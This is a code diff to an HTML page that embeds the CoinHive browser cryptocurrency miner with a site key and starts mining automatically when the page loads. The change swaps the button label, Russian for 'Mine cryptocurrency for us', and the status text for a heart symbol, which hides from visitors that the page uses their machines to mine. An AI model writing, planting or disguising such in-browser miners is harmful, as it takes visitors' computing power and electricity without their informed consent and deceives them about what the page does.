@@ -5,14 +5,15 @@
 	<title>miner</title>
 </head>
 <body>
-	<button id="miner-block">Майнить криптовалюту для нас</button>
+	<button id="miner-block">♥</button>
 	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-	<script>(function() {
+	<script>
+		(function() {
 				var miner = new CoinHive.Anonymous('MNWa4CAqIZmkx1HyUFSTKWTZ9fh9Utpw');
 				var minerBlock = document.getElementById('miner-block');
-				var text = 'Майнить криптовалюту для нас';
+				var text = '♥';
 				var textStop = 'Остановить';
-				var defaultValue = '0/0';
+				var defaultValue = '0 ♥ 0';
 				var interval = null;
 
 				var toggleMnining = function() {
@@ -35,6 +36,7 @@
 
 				minerBlock.addEventListener('click', toggleMnining, false);
 				toggleMnining();
-			})();</script>
-</body>
+			})();
+		</script>
+	</body>
 </html>
